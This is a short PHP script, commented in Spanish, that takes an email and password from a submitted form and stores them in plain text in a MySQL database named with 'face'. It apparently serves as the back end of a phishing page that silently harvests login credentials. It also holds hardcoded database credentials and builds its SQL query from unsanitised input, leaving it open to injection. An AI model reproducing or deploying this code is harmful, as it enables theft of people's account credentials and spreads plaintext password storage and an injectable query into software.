<?php
$servername = "sql213.infinityfree.com";
$username = "if0_37069819"; // Cambia esto si tu usuario de MySQL es diferente
$password = "SfIdExSKPaJh2"; // Cambia esto si tu contraseña de MySQL es diferente
$dbname = "if0_37069819_face";

// Crear la conexión
$conn = new mysqli($servername, $username, $password, $dbname);

// Verificar la conexión
if ($conn->connect_error) {
    die("Conexión fallida: " . $conn->connect_error);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Guardar la contraseña en texto plano
    $sql = "INSERT INTO users (email, password) VALUES ('$email', '$password')";

    if ($conn->query($sql) === TRUE) {
        echo "";
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }
}

$conn->close();
?>
